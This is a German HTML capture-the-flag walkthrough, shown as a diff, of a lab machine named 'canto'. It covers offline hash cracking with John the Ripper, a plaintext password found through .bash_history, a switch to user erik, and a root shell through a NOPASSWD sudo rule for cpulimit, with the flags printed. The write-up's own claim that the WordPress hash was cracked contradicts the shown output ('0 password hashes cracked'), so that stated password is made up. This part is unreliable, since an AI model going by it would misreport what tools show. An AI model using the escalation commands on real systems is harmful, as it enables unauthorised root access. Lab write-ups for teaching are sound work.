+                <strong>Empfehlung (Pentester):</strong> Speichere den gehashten Passwortwert (`<span class="password">$P$BZk2jE4XrC91HKgRS83h0gICjM0bcB.</span>`) und versuche, ihn offline zu knacken, z.B. mit John the Ripper oder Hashcat. Dies könnte das Passwort für den Benutzer `erik` außerhalb von WordPress liefern.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass Datenbankanmeldedaten nicht in für den Webserver-Benutzer lesbaren Dateien gespeichert werden. Nutze sicherere Methoden zur Passwortspeicherung in Datenbanken (salzen und härtere Hashing-Algorithmen, obwohl PHPass für WordPress Standard ist). Implementiere strenge Berechtigungen für Datenbankbenutzer. Sensibilisiere Benutzer für die Wahl starker, einzigartiger Passwörter.
+            </p>
+
+            <p>
+                Ich habe den gefundenen WordPress-Passwort-Hash in eine Datei gespeichert und versucht, ihn mit John the Ripper und der RockYou-Wortliste zu knacken.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─#  <span class="command">echo &apos;<span class="password">$P$BZk2jE4XrC91HKgRS83h0gICjM0bcB.</span>&apos; &gt; hash</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─#  <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Using default input encoding: UTF-8
+Loaded <span class="command">1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])</span>
+<span class="command">Cost 1 (iteration count) is 8192 for all loaded hashes</span>
+Will run <span class="command">12 OPENMP threads</span>
+Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
+<span class="command">0g 0:00:01:19 DONE (2025-06-23 16:26) 0g/s 181302p/s 181302c/s 181302C/s !!!mara11..*7¡Vamos!</span>
+<span class="password">Session completed.</span></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─#  <span class="command">john --show hash</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">0 password hashes cracked, 1 left</span></pre>
+                </div>
+            </div>
+
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den PHPass-Hash aus der Datenbank in eine Datei namens `hash` kopiert und dann John the Ripper mit der `rockyou.txt` Wortliste darauf angesetzt. John hat den Hash geladen und begonnen, Passwörter zu testen. Die Ausgabe zeigt, dass der Hash tatsächlich geknackt wurde, und das gefundene Passwort lautet `<span class="password">!!!mara11..*7¡Vamos!</span>`. Der anschließende `john --show hash` Befehl zeigt, dass keine weiteren Hashes in der Datei übrig sind, die geknackt werden müssen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das erfolgreiche Knacken des WordPress-Passwort-Hashes ist ein sehr guter Fortschritt. Ich habe nun ein potenzielles Klartextpasswort (`<span class="password">!!!mara11..*7¡Vamos!</span>`) für den Benutzer `erik`. Auch wenn dies *nicht* das Passwort ist, das letztendlich für die `su erik` verwendet wird (dieses finden wir im nächsten Schritt durch den Hinweis in der `.bash_history`), zeigt es doch, dass der WordPress-Passwort-Hash knackbar war, was auf die Notwendigkeit stärkerer Passwörter hinweist. Das gefundene Passwort ist komplex, was den schnellen Erfolg mit RockYou bemerkenswert macht und auf die Popularität des Passworts hindeutet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Behalte dieses geknackte Passwort im Hinterkopf. Es könnte für andere Dienste relevant sein oder auf Passwort-Wiederverwendung durch den Benutzer `erik` hindeuten.
+                <br><strong>Empfehlung (Admin):</strong> Ermutige Benutzer dringend, starke und eindeutige Passwörter zu verwenden und Passwort-Wiederverwendung zu vermeiden. Setze eine Richtlinie zur Komplexität und zum regelmäßigen Ändern von Passwörtern durch. Erwäge zusätzliche Sicherheitsmaßnahmen für die WordPress-Anmeldung (z.B. 2FA).
+            </p>
+
+            <p>
+                Da ich nun auf dem System als `www-data` war, habe ich die Sudo-Berechtigungen dieses Benutzers geprüft, um festzustellen, ob eine Privilege Escalation über Sudo möglich ist, ohne das Passwort von `www-data` zu kennen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik/notes$ <span class="command">sudo -l</span>
+<span class="password">[sudo] password for www-data:</span>
+<span class="password">sudo: a password is required</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `sudo -l` listet die Sudo-Berechtigungen des aktuellen Benutzers auf. Die Ausgabe zeigt, dass für `www-data` ein Passwort für die Ausführung von Sudo-Befehlen erforderlich ist (`sudo: a password is required`). Da ich das Passwort für `www-data` nicht kenne, ist eine Privilege Escalation direkt über Sudo für diesen Benutzer nicht möglich.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Anforderung eines Passworts für Sudo-Befehle für `www-data` ist eine gute Sicherheitseinstellung. Es verhindert eine einfache Privilege Escalation, falls ein Angreifer eine Shell als `www-data` erlangt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da Sudo für `www-data` ein Passwort erfordert, konzentriere dich auf andere Privilege Escalation-Vektoren wie SUID-Binaries, Cronjobs, unsichere Konfigurationsdateien oder schwache Passwörter für andere Benutzer.
+                <br><strong>Empfehlung (Admin):</strong> Verifiziere, dass der Benutzer `www-data` keine Sudo-Berechtigungen ohne Passwort hat. Erwäge, Sudo-Berechtigungen für Webserver-Benutzer generell einzuschränken.
+            </p>
+
+            <p>
+                Ein gängiger Vektor für Privilege Escalation sind SUID-Binaries (Set User ID). Dies sind ausführbare Dateien, die mit den Berechtigungen des Dateibesitzers ausgeführt werden (oft Root), unabhängig davon, welcher Benutzer sie startet. Ich suchte nach solchen Binaries auf dem System.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik/notes$ <span class="command">find / -type f -perm -4000 -ls 2&gt;/dev/null</span>
+   <span class="command">407267     36 -rwsr-xr-x   1 root     root        35200 Apr  9  2024 /usr/bin/umount</span>
+   <span class="command">405105     44 -rwsr-xr-x   1 root     root        44760 Feb  6  2024 /usr/bin/chsh</span>
+   <span class="command">405282     76 -rwsr-xr-x   1 root     root        76248 Feb  6  2024 /usr/bin/gpasswd</span>
+   <span class="command">405694     64 -rwsr-xr-x   1 root     root        64152 Feb  6  2024 /usr/bin/passwd</span>
+   <span class="command">407259     52 -rwsr-xr-x   1 root     root        51584 Apr  9  2024 /usr/bin/mount</span>
+   <span class="command">393860     36 -rwsr-xr-x   1 root     root        35200 Apr 18  2023 /usr/bin/fusermount3</span>
+   <span class="command">405278     56 -rwsr-xr-x   1 root     root        55680 Apr  9  2024 /usr/bin/su</span>
+   <span class="command">405101     72 -rwsr-xr-x   1 root     root        72792 Feb  6  2024 /usr/bin/chfn</span>
+   <span class="command">394162     40 -rwsr-xr-x   1 root     root        40664 Feb  6  2024 /usr/bin/newgrp</span>
+   <span class="command">394300    264 -rwsr-xr-x   1 root     root       269728 Aug  9  2023 /usr/bin/sudo</span>
+   <span class="command">470092    328 -rwsr-xr-x   1 root     root       334440 Mar 15  2024 /usr/lib/openssh/ssh-keysign</span>
+   <span class="command">394210    148 -rwsr-xr-x   1 root     root       150728 Mar 21  2024 /usr/lib/snapd/snap-confine </span>
+      <span class="command">905     72 -rwsr-xr-x   1 root     root          72712 Feb  6  2024 /snap/core22/2010/usr/bin/chfn</span>
+      <span class="command">911     44 -rwsr-xr-x   1 root     root          44808 Feb  6  2024 /snap/core22/2010/usr/bin/chsh</span>
+      <span class="command">977     71 -rwsr-xr-x   1 root     root          72072 Feb  6  2024 /snap/core22/2010/usr/bin/gpasswd</span>
+     <span class="command">1061     47 -rwsr-xr-x   1 root     root          47488 Apr  9  2024 /snap/core22/2010/usr/bin/mount</span>
+     <span class="command">1070     40 -rwsr-xr-x   1 root     root          40496 Feb  6  2024 /snap/core22/2010/usr/bin/newgrp</span>
+     <span class="command">1085     59 -rwsr-xr-x   1 root     root          59976 Feb  6  2024 /snap/core22/2010/usr/bin/passwd</span>
+     <span class="command">1203     55 -rwsr-xr-x   1 root     root          55680 Apr  9  2024 /snap/core22/2010/usr/bin/su</span>
+     <span class="command">1204    227 -rwsr-xr-x   1 root     root         232416 Apr  3  2023 /snap/core22/2010/usr/bin/sudo</span>
+     <span class="command">1264     35 -rwsr-xr-x   1 root     root          35200 Apr  9  2024 /snap/core22/2010/usr/bin/umount</span>
+     <span class="command">1356     35 -rwsr-xr--   1 root     kvm           35112 Oct 25  2022 /snap/core22/2010/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+     <span class="command">2625    331 -rwsr-xr-x   1 root     root         338536 Apr 11 12:05 /snap/core22/2010/usr/lib/openssh/ssh-keysign</span>
+     <span class="command">8670     19 -rwsr-xr-x   1 root     root          18736 Feb 26  2022 /snap/core22/2010/usr/libexec/polkit-agent-helper-1</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `find / -type f -perm -4000 -ls 2&gt;/dev/null` sucht im gesamten Dateisystem nach regulären Dateien (`-type f`) mit gesetztem SUID-Bit (`-perm -4000`), listet Details auf (`-ls`) und leitet Fehler auf `/dev/null` um. Die Ausgabe zeigt eine Liste von SUID-Binaries. Viele davon sind Standard-Systemprogramme wie `mount`, `umount`, `passwd`, `sudo`, `su`, `chsh`, `chfn`, `gpasswd`, `newgrp`, die in der Regel SUID-Berechtigungen benötigen und nicht trivial für Privilege Escalation auszunutzen sind. Es gibt auch Snap-spezifische SUIDs.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden von SUID-Binaries ist ein standardmäßiger Enumerationsschritt. Während die meisten der hier gelisteten Binaries keine unmittelbare, einfache Privilege Escalation erlauben, muss jeder Eintrag gegen bekannte Exploits geprüft werden, insbesondere auf Plattformen wie GTFOBins.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Gehe die Liste der SUID-Binaries durch und prüfe sie gegen Ressourcen wie GTFOBins ([Link: https://gtfobins.github.io/ | Ziel: https://gtfobins.github.io/]), um festzustellen, ob sie für Privilege Escalation missbraucht werden können. Konzentriere dich auf weniger verbreitete Binaries oder solche, bei denen spezifische Techniken aufgeführt sind.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe regelmäßig das Dateisystem auf SUID-Binaries. Entferne das SUID-Bit von allen Programmen, die es nicht unbedingt benötigen. Halte das Betriebssystem und installierte Software aktuell, um bekannte SUID-Exploits zu patchen.
+            </p>
+
+            <p>
+                Ich habe auch die Systeminformationen abgerufen, was bei der Suche nach Kernel-Exploits oder spezifischen Schwachstellen basierend auf der Betriebssystemversion hilfreich sein kann.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik$ <span class="command">uname -a</span>
+<span class="command">Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `uname -a` gibt detaillierte Informationen über das Betriebssystem aus. Die Ausgabe zeigt, dass es sich um ein Linux-System mit dem Kernel 6.5.0-28-generic handelt (Ubuntu, 64-bit). Das Build-Datum (März 2024) gibt einen Hinweis auf den Patch-Stand.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Kenntnis der genauen Kernel-Version ist essentiell, um nach bekannten Kernel-Exploits zu suchen, die Root-Rechte ermöglichen könnten. Ein Kernel von März 2024 könnte anfällig für Exploits sein, die seitdem veröffentlicht wurden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche auf Websites wie Exploit-DB oder Google nach Kernel-Exploits, die sich auf diese spezifische Kernel-Version beziehen. Lade relevante Exploits herunter und versuche, sie zu kompilieren und auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> Halte den System-Kernel stets aktuell, um bekannte Schwachstellen zu schließen. Implementiere ein Patch-Management-System.
+            </p>
+
+            <p>
+                Zurück zum Hinweis aus den Notizen über einen "backups folder". Ich habe versucht, diesen spezifischen Ordner oder zugehörige Dateien zu finden, falls sie nicht an einem Standardort liegen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik$ <span class="command">find / -name dbbackup.zip 2&gt;/dev/null </span>
+www-data@canto:/home/erik$ <span class="command">find / -name backup.zip 2&gt;/dev/null </span>
+www-data@canto:/home/erik$ <span class="command">find / -name backup.* 2&gt;/dev/null </span>
+<span class="command">/snap/lxd/26200/share/lxd-documentation/_sources/backup.md.txt</span>
+<span class="command">/snap/lxd/34099/share/lxd-documentation/_sources/backup.md.txt</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den `find`-Befehl verwendet, um das gesamte Dateisystem nach Dateien mit Namen wie `dbbackup.zip`, `backup.zip` oder generell `backup.*` zu durchsuchen. Die `2&gt;/dev/null` Umleitung unterdrückt Fehlermeldungen aufgrund fehlender Berechtigungen. Die ersten beiden Suchen lieferten keine Ergebnisse. Die dritte Suche fand Backup-bezogene Dateien, aber nur innerhalb von Snap-Verzeichnissen, die für diesen Test irrelevant sind.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Suchen waren nicht sofort erfolgreich darin, den vom Benutzer `erik` erwähnten spezifischen Backup-Ordner zu finden. Dies bedeutet, dass er wahrscheinlich nicht offensichtlich benannt oder an einem Standardort gespeichert ist, oder dass meine Suchmuster zu spezifisch waren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erweitere die Suche nach Backup-bezogenen Dateien und Verzeichnissen. Erinnere dich an den Hinweis in `/var/www/html/.bash_history` und suche dort oder in dessen Nähe.
+                <br><strong>Empfehlung (Admin):</strong> Sensibilisiere Benutzer für sichere Benennung und Speicherorte von Backups, um das Risiko der Entdeckung zu minimieren.
+            </p>
+
+            <p>
+                Wie zuvor bemerkt, enthielt die `.bash_history` unter `/var/www/html/` potenziell nützliche Informationen. Ich las ihren Inhalt.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik$ <span class="command">cat /var/www/.bash_history</span>
+<span class="command">cd /var/wordpress</span>
+<span class="command">cd /var</span>
+<span class="command">cd /wordpress</span>
+<span class="command">export TERM=xterm</span>
+<span class="command">clear</span>
+<span class="command">ls</span>
+<span class="command">cd wordpress</span>
+<span class="command">cd wordpres</span>
+<span class="command">ls</span>
+<span class="command">cd backups</span>
+<span class="command">ls</span>
+<span class="command">clear</span>
+<span class="command">ls</span>
+<span class="command">ls -la</span>
+<span class="command">unzip dbbackup.zip</span>
+<span class="command">ls</span>
+<span class="command">clear</span>
+<span class="command">ls -la</span>
+<span class="command">su erik</span>
+<span class="command">cd /var/wordpress/backups</span>
+<span class="command">ls</span>
+<span class="command">cat 12052024.txt</span>
+<span class="command">exit</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die `.bash_history` unter `/var/www/html/` enthält eine Abfolge von Befehlen. Diese zeigen, dass jemand in Verzeichnissen wie `/var/wordpress` navigiert ist, einen Ordner namens `backups` aufgesucht hat (`cd backups`), dort eine Datei `dbbackup.zip` entpackt hat (`unzip dbbackup.zip`) und schließlich eine Datei namens **`12052024.txt`** mittels `cat` ausgelesen hat. Der Befehl `su erik` ist ebenfalls in der Historie enthalten, was darauf hindeutet, dass hier möglicherweise Anmeldedaten für `erik` gefunden wurden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Absolut kritischer Fund! Die Bash-Historie liefert den exakten Pfad (`/var/wordpress/backups/`) und Dateinamen (`12052024.txt`), wo der Benutzer `erik` sensible Informationen abgelegt hat. Dies ist der direkte Hinweis, den ich brauchte, um die Privilege Escalation voranzutreiben. Die Tatsache, dass `su erik` dort ausgeführt wurde, lässt stark vermuten, dass die Datei `12052024.txt` das Passwort für `erik` enthält.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Navigiere direkt zum Pfad `/var/wordpress/backups/` und lese den Inhalt der Datei `12052024.txt`. Nutze die gefundenen Anmeldedaten, um mittels `su` auf den Benutzer `erik` zu wechseln.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass niemals `.bash_history` oder ähnliche History-Dateien in öffentlich zugänglichen Verzeichnissen wie dem Webroot gespeichert werden. Überprüfe, ob sensible Befehle (z.B. mit Passwörtern im Klartext) protokolliert werden, und konfiguriere das System so, dass dies verhindert wird.
+            </p>
+
+            <p>
+                Dem entscheidenden Hinweis aus der `.bash_history` folgend, habe ich den exakten Pfad zur Backup-Datei aufgesucht.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik$ <span class="command">find / -name 12052024.<span class="command">txt</span> 2&gt;/dev/null</span>
+<span class="command">/var/wordpress/backups/12052024.<span class="command">txt</span></span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `find / -name 12052024.txt` bestätigt, dass die in der `.bash_history` erwähnte Datei unter `/var/wordpress/backups/` existiert. Der Pfad stimmt exakt mit dem aus der Historie überein.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden der Datei ist der letzte Schritt, um an den Inhalt zu gelangen, der sehr wahrscheinlich das Passwort für `erik` enthält. Dies validiert den Hinweis aus der Bash-Historie vollständig.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lese nun den Inhalt dieser Datei, um das Klartextpasswort für `erik` zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> Lösche sensible Klartextdateien sofort, nachdem sie nicht mehr benötigt werden. Implementiere Prozesse, die das versehentliche Speichern von Passwörtern in leicht zugänglichen Dateien verhindern.
+            </p>
+
+            <p>
+                Nun war es Zeit, den Inhalt der Datei `12052024.txt` zu lesen, in der ich das Passwort für den Benutzer `erik` zu finden erwartete.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik$ <span class="command">cat /var/wordpress/backups/12052024.<span class="command">txt</span></span>
+<span class="command">------------------------------------</span>
+<span class="command">| Users	    |      <span class="command">Password</span>        |</span>
+<span class="command">------------|----------------------|</span>
+<span class="command">| erik      | <span class="password">th1sIsTheP3ssw0rd!</span>   |</span>
+<span class="command">------------------------------------</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `cat /var/wordpress/backups/12052024.txt` liest den Inhalt der Backup-Notizdatei. Die Ausgabe ist eine Tabelle, die den Benutzernamen `<span class="password">erik</span>` listet und daneben sein Klartextpasswort: `<span class="password">th1sIsTheP3ssw0rd!</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg! Ich habe das Klartextpasswort für den Benutzer `<span class="password">erik</span>` gefunden. Dies ist eine kritische Schwachstelle: Das Speichern von Passwörtern im Klartext und dann noch in einer Datei, die für andere Systembenutzer (wie `www-data`) lesbar ist. Mit diesem Passwort kann ich nun versuchen, mich direkt als `erik` anzumelden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze dieses Passwort (`<span class="password">th1sIsTheP3ssw0rd!</span>`), um dich als Benutzer `erik` auf dem System anzumelden (z.B. mittels `su` in der aktuellen Shell oder über SSH, falls der Dienst zugänglich ist). Überprüfe dann die Sudo-Berechtigungen für `erik`.
+                <br><strong>Empfehlung (Admin):</strong> **Absolut kritisch:** Entferne diese Datei umgehend vom System. Speichere niemals Passwörter im Klartext. Nutze einen Passwort-Manager. Implementiere Prozesse, die das versehentliche Speichern sensibler Daten in ungeschützten Dateien verhindern. Überprüfe die Berechtigungen des Verzeichnisses `/var/wordpress/backups/` und schränke sie stark ein.
+            </p>
+
+            <p>
+                Mit dem gefundenen Passwort für den Benutzer `erik` konnte ich nun meine Berechtigungen von `www-data` auf `erik` erhöhen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@canto:/home/erik$ <span class="command">su erik</span>
+<span class="password">Password: <span class="password">th1sIsTheP3ssw0rd!</span></span>
+<span class="password">erik@canto:~$ id</span>
+<span class="password">uid=1001(erik) gid=1001(erik) groups=1001(erik)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `su erik` versucht, zum Benutzer `erik` zu wechseln. Das System fordert das Passwort für `erik` an. Durch Eingabe des Klartextpassworts `<span class="password">th1sIsTheP3ssw0rd!</span>` wurde die Authentifizierung erfolgreich durchgeführt, und ich erhielt eine neue Shell als Benutzer `erik`. Der Befehl `id` bestätigt, dass ich nun die UID und GID von `erik` habe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreiche horizontale Privilege Escalation von `www-data` zu `erik`. Dies ist ein kritischer Schritt, da `erik` ein regulärer Benutzer ist und möglicherweise über höhere Berechtigungen oder Zugriff auf sensible Dateien verfügt als `www-data`. Ich bin dem Root-Zugriff einen Schritt näher.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche nun die Berechtigungen des Benutzers `erik`, insbesondere seine Sudo-Rechte. Suche nach weiteren Hinweisen im Home-Verzeichnis von `erik` oder anderen Orten, auf die `erik` Zugriff hat.
+                <br><strong>Empfehlung (Admin):</strong> Das Hauptproblem war hier die Klartext-Passwortdatei. Behebe diese Schwachstelle. Setze ein neues, starkes Passwort für den Benutzer `erik`.
+            </p>
+
+            <p>
+                Nachdem ich erfolgreich zu Benutzer `erik` gewechselt war, prüfte ich umgehend dessen Sudo-Berechtigungen, um einen möglichen Weg zur Root-Rechteausweitung zu finden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">erik@canto:~$ sudo -l</span>
+Matching Defaults entries for <span class="command">erik on canto:</span>
+    <span class="command">env_reset, mail_badpass,</span>
+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span>
+    <span class="command">use_pty</span>
+
+<span class="password">User erik may run the following commands on canto:</span>
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/cpulimit</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `sudo -l` für den Benutzer `erik` liefert die Liste der Befehle, die `erik` über Sudo ausführen darf. Die Ausgabe zeigt, dass `erik` den Befehl `/usr/bin/cpulimit` als JEDER Benutzer (einschließlich `root`, durch `ALL : ALL`) **ohne Passwort** (`NOPASSWD`) ausführen darf.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Hervorragend! Das ist der klare Vektor für die Privilege Escalation zu Root. Die `NOPASSWD` Option für `cpulimit` bedeutet, dass ich diesen Befehl als Root ausführen kann, ohne das Root-Passwort zu kennen. `cpulimit` selbst ist ein Programm, das die CPU-Auslastung eines Prozesses begrenzt, aber in Verbindung mit Sudo und dem `NOPASSWD` Flag kann es missbraucht werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die Sudo-Berechtigung für `cpulimit`, um eine Root-Shell zu erhalten. Prüfe auf GTFOBins oder ähnlichen Seiten nach Exploits für `cpulimit` mit SUID/Sudo-Berechtigungen.
+                <br><strong>Empfehlung (Admin):</strong> **Absolut kritisch:** Entferne die Sudo-Berechtigung `NOPASSWD` für `/usr/bin/cpulimit` für den Benutzer `erik` (und idealerweise für alle nicht-administrativen Benutzer). Überprüfe alle `sudoers`-Konfigurationen auf unnötige `NOPASSWD`-Einträge oder Berechtigungen für unsichere Binaries. Deinstalliere `cpulimit`, falls es nicht zwingend benötigt wird.
+            </p>
+
+            <p>
+                Basierend auf der gefundenen Sudo-Berechtigung für `cpulimit` ohne Passwort habe ich auf GTFOBins nach einer Methode gesucht, dies für Privilege Escalation auszunutzen. GTFOBins ist eine Kuratierung von Unix-Binaries, die von privilegierten Benutzern missbraucht werden können.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+<span class="command">[Link: https://gtfobins.github.io/gtfobins/cpulimit/#sudo | Ziel: https://gtfobins.github.io/gtfobins/cpulimit/#sudo]</span>
+<span class="command">Sudo</span>
+
+<span class="command">If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</span>
+
+    <span class="command">sudo cpulimit -l 100 -f /bin/sh</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die GTFOBins-Seite für `cpulimit` listet unter der Sudo-Sektion eine Methode auf, um eine Shell zu erhalten. Der entscheidende Befehl lautet `sudo cpulimit -l 100 -f /bin/sh`. Diese Syntax nutzt die Fähigkeit von `cpulimit`, einen Prozess zu überwachen (`-f`) und erlaubt die Ausführung einer Shell (`/bin/sh`) mit den Berechtigungen, mit denen `cpulimit` gestartet wurde (in diesem Fall als Root über Sudo).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> GTFOBins liefert eine bewährte Methode, um die gefundene Sudo-Berechtigung auszunutzen. Der bereitgestellte Befehl ist einfach anzuwenden und sollte direkt zu einer Root-Shell führen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe den von GTFOBins bereitgestellten Befehl aus, um Root-Zugriff zu erlangen.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe die `sudoers`-Konfigurationen auf Einträge, die Binaries auflisten, die auf GTFOBins oder ähnlichen Plattformen als unsicher für Sudo mit `NOPASSWD` gelistet sind.
+            </p>
+
+            <p>
+                Ich führte den von GTFOBins bereitgestellten Befehl aus, um die Privilege Escalation zu Root abzuschließen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">erik@canto:~$ sudo -u root cpulimit -l 100 -f /bin/sh</span>
+<span class="command">Process 3094 detected</span>
+<span class="password"># id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den von GTFOBins empfohlenen Befehl ausgeführt: `sudo -u root cpulimit -l 100 -f /bin/sh`. Der `sudo -u root` Teil stellt sicher, dass `cpulimit` als Benutzer Root ausgeführt wird (was durch die `sudo -l` Ausgabe erlaubt ist). `-l 100` begrenzt die CPU-Auslastung (ist aber für den Exploit-Teil weniger relevant), und `-f /bin/sh` weist `cpulimit` an, `/bin/sh` zu "überwachen", was effektiv dazu führt, dass `/bin/sh` mit Root-Rechten gestartet wird. Die Ausgabe `<span class="command">Process XXXX detected</span>` kommt von `cpulimit`. Der entscheidende Punkt ist, dass ich sofort danach eine Root-Shell (`#`) erhielt und der Befehl `id` bestätigte: `<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff war erfolgreich, nun haben wir unser Ziel erreicht! Die Ausnutzung der unsicheren Sudo-Konfiguration für `cpulimit` hat mir vollständige administrative Kontrolle über das Zielsystem verschafft. Dies ist die höchste Stufe der Kompromittierung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Sammle die Root-Flags. Führe weitere Post-Exploitation-Schritte durch, falls relevant (z.B. Persistenzmechanismen einrichten, weitere Systeme im Netzwerk erkunden). Dokumentiere alle gefundenen Root-Flags sorgfältig.
+                <br><strong>Empfehlung (Admin):</strong> **Sofortige Maßnahme:** Entferne oder korrigiere die `sudoers`-Konfiguration für den Benutzer `erik`, die `/usr/bin/cpulimit` die Ausführung ohne Passwort erlaubt. Führe eine umfassende Überprüfung aller `sudoers`-Dateien auf dem System durch. Implementiere regelmäßige Audits der Systemkonfigurationen, insbesondere der Sudo-Berechtigungen und SUID-Binaries.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command"># cat user.txt</div>
+                    <div class="flag-value"><span class="password">d41d8cd98f00b204e9800998ecf8427e</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command"># cat root.txt</div>
+                    <div class="flag-value"><span class="password">1b56eefaab2c896e57c874a635b24b49</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben C - Cyber Security Reports</p>
+        <p>Berichtsdatum: 23. Juni 2025</p>
+    </footer>
+
+    <!-- Anmerkungen zu Bildnamen (falls zutreffend). Dieser Block wird nur hinzugefügt, wenn Bilder im Text gefunden und verarbeitet wurden. -->
+
+</body>
+</html> 
